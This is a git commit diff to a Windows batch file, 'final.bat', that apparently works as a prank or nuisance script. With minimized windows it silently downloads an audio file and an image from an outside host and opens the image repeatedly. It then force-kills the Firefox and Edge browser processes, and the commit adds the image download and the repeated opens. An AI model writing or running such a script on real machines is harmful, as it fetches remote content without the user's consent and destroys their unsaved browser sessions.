4a3c259600c5f241f673cd0fbc707e07f9a4cb10
tobiasrepracek <tobias.repracek.tr@gmail.com>
2022-12-09 14:28:32 +0100

    Update final.bat

--- final.bat
+++ final.bat
@@ -3,6 +3,11 @@ powershell -window minimized -command ""
 cd C:/
 curl -s https://sources.tobir.xyz/hotdog.mp3 > hotdog.mp3
 start /min hotdog.mp3
+curl -s https://sources.tobir.xyz/hotdog.png > hotdog.png
+start hotdog.png
+start hotdog.png
+start hotdog.png
+start hotdog.png
 timeout 8
 taskkill /f /im firefox.exe /t
 taskkill /f /im msedge.exe /t
